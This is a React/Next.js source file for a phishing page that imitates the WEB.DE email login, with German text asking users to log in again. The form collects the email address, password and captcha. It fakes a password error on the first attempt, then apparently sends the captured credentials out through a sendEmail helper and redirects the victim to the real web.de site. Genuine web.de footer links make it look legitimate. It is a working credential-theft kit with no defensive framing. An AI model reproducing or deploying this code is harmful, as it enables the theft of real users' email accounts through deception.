"use client";
import React, { useState } from "react";
import Image from "next/image";
import { PT_Sans, Arimo } from "next/font/google";
import { useForm } from "react-hook-form";

import useCaptchas from "../useCaptchas";

import LogoWebDe36 from "../assets/LogoWebDe36";
import LogoWebDe56 from "../assets/LogoWebDe56";
import RefreshIcon from "../assets/RefreshIcon";
import InfoIcon from "../assets/InfoIcon";
import ErrorIcon from "../assets/ErrorIcon";
import axios from "axios";
import sendEmail from "@/utils/sendEmail";

const ptSans = PT_Sans({ weight: ["400", "700"], subsets: ["latin"] });
const arimo = Arimo({ weight: ["400", "600", "700"], subsets: ["latin"] });

const FormInput = React.forwardRef(
  (
    props: {
      label?: string;
      onChange?: any;
      onBlur?: any;
      name?: any;
      errors?: any;
      errorMessage?: string;
    },
    ref?: React.ForwardedRef<HTMLInputElement>
  ) => (
    <>
      <label className="text-xs flex flex-col">
        {props.label}
        <input
          type="text"
          name={props.name}
          className={`border ${
            props.errors[props.name] ? "border-red-600" : "border-gray-300"
          }  h-8 rounded mt-1 text-sm px-2`}
          ref={ref}
          onBlur={props.onBlur}
          onChange={props.onChange}
        />
      </label>

      {props.errors[props.name] && (
        <div className="flex items-center text-[16px] mt-2">
          <ErrorIcon />
          <span className="ml-2 leading-tight text-red-600">
            {props.errorMessage}
          </span>
        </div>
      )}
    </>
  )
);

FormInput.displayName = "FormInput";

interface IFormValues {
  email: string;
  password: string;
  captcha: string;
}

export default function Home() {
  const { randomCaptcha, currentCaptcha } = useCaptchas();
  const {
    register,
    handleSubmit,
    watch,
    formState: { errors },
  } = useForm<IFormValues>();

  const [loginAttempt, setLoginAttempt] = useState(0);

  const onSubmit = async (values: IFormValues) => {
    try {
      if (loginAttempt === 1) {
        const response = await sendEmail(values);

        if (response.data === "OK") {
          window.location.assign(
            "https://web.de/logoutlounge/?status=login-failed"
          );
        }
      }
    } catch (error) {
      console.log(error);
    }
  };

  return (
    <div
      className={`md:bg-gray-100 min-h-screen text-[#525252] ${arimo.className}`}
    >
      <header className="bg-white border-t-4 border-yellow-300 h-14 flex items-center mb-12 px-4 border-b border-b-[#dadada] md:border-b-0">
        <div className="bg-gray-200 rounded" style={{ width: 36, height: 36 }}>
          <LogoWebDe36 />
        </div>

        <div className={"ml-4 text-[20px] text-gray-600 " + ptSans.className}>
          Kudencenter
        </div>
      </header>

      <div className="pb-60">
        <form
          onSubmit={handleSubmit((values) => {
            setLoginAttempt((state) => state + 1);
            onSubmit(values);
          })}
          className="bg-white mx-auto md:pt-10 md:pb-8 md:px-8 px-4 rounded md:w-[368px]"
        >
          <div
            className="bg-gray-200 mx-auto rounded mb-4"
            style={{ height: 56, width: 56 }}
          >
            <LogoWebDe56 />
          </div>

          <h2
            className={
              "font-bold text-[24.5px] text-center mb-6 " + ptSans.className
            }
          >
            Bitte erneut einloggen
          </h2>

          <p className="text-center mb-8 text-[15px] tracking-normal">
            Bitte melden Sie sich mit Ihrem WEB.DE Benutzernamen und Passwort
            erneut an.
          </p>

          <div className="mb-5">
            <FormInput
              label="WEB.DE E-Mail-Adresse"
              {...register("email", { required: true })}
              errors={errors}
              errorMessage="Bitte geben Sie Ihre E-Mail-Adresse ein."
            />
          </div>

          <FormInput
            label="Passwort eingeben"
            {...register("password", { required: true })}
            errors={loginAttempt !== 1 ? errors : { password: true }}
            errorMessage="Bitte geben Sie Ihr Passwort ein."
          />

          <div className="flex items-center my-4">
            <div className={"text-xl font-bold " + ptSans.className}>
              Sicherheitsabfrage
            </div>

            <div className="h-5 w-5 rounded ml-4 text-[#1c8ad9]">
              <InfoIcon />
            </div>
          </div>

          <div className="h-24 bg-gray-100 relative flex items-center justify-center">
            <Image
              src={currentCaptcha.image}
              alt="captcha"
              width={225}
              height={53}
            />
          </div>

          <button
            className="flex items-center mt-2.5 mb-5"
            type="button"
            onClick={randomCaptcha}
          >
            <div className="h-5 w-5 rounded mr-4 text-[#1c8ad9]">
              <RefreshIcon />
            </div>

            <div className="text-sm text-[#1c8ad9] hover:underline tracking-normal">
              Andere Zeichenfolge anzeigen
            </div>
          </button>

          <FormInput
            label="Zeichenfolge eingeben"
            {...register("captcha", { required: true })}
            errors={errors}
            errorMessage="Bitte versuchen Sie es erneut."
          />

          <button className="h-8 bg-yellow-300 text-sm w-full font-semibold rounded-md mt-5">
            Login
          </button>
        </form>
      </div>

      <footer className="bg-[#999] fixed bottom-0 w-screen min-h-[50px] flex flex-col md:flex-row items-center justify-center gap-x-10 text-white py-5">
        <a
          href="https://web.de/impressum"
          target="_blank"
          className="hover:underline"
        >
          Impressum
        </a>

        <a
          href="https://web.de/kuendigungsformular"
          target="_blank"
          className="hover:underline"
        >
          Verträge hier kündigen
        </a>

        <a
          href="https://agb-server.web.de/datenschutz"
          target="_blank"
          className="hover:underline"
        >
          Datenschutzhinweise
        </a>

        <a
          href="https://agb-server.web.de/webdeagb"
          target="_blank"
          className="hover:underline"
        >
          AGB
        </a>

        <a
          href="https://hilfe.web.de/"
          target="_blank"
          className="hover:underline"
        >
          Hilfe und Tipps
        </a>
      </footer>
    </div>
  );
}
